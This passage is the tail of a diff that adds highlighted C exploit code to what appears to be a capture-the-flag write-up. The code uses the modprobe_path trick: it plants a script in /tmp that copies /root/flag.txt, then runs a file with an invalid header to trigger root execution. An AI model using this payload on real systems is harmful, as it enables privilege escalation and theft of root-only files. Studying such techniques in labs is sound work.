+    system(<span class="hljs-string">"echo -e '\\xff\\xff\\xff\\xff' &gt; /tmp/invalid"</span>)<span class="hljs-comment">;</span>
+    system(<span class="hljs-string">"chmod u+x /tmp/invalid"</span>)<span class="hljs-comment">;</span>
+    system(<span class="hljs-string">"echo '#!/bin/sh\n cat /root/flag.txt &gt; /tmp/flag' &gt; /tmp/km "</span>)<span class="hljs-comment">;</span>
+    system(<span class="hljs-string">"chmod u+x /tmp/km"</span>)<span class="hljs-comment">;</span>
+    system(<span class="hljs-string">"/tmp/invalid"</span>)<span class="hljs-comment">;</span>
+
+    return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
+}
+</code></pre>
+
